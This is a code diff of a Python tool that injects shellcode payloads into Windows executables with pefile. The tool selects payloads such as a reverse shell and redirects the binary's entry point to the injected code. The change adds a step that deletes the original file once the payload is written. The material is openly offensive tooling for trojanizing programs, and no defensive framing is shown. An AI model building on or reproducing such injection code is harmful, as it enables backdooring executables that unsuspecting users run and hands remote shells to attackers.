@@ -2,6 +2,7 @@ import pefile
 from config import VERBOSE
 import utilities
 import struct
+import os
 
 
 def msgbox(oep, base):
@@ -98,8 +99,8 @@ def payload_selection(payload, oep, base, *args, **kwargs):
         return reverse_shell(oep, base, *args, **kwargs)
 
 
-def insert_payload(path, payload, *args, **kwargs):
-    path = utilities.make_duplicate(path, payload)
+def insert_payload(original_path, payload, *args, **kwargs):
+    path = utilities.make_duplicate(original_path, payload)
     pe = pefile.PE(path)
 
     # We will first change the binaries entry point to be the newly injected
@@ -122,6 +123,11 @@ def insert_payload(path, payload, *args, **kwargs):
     pe.set_bytes_at_offset(raw_offset, shellcode)
     pe.write(path)
     print("[x] Payload injected\n")
+
+    if os.path.exists(original_path):
+        if VERBOSE:
+            print("Removing intermediate file")
+        os.remove(original_path)
 
 
 if __name__ == "__main__":
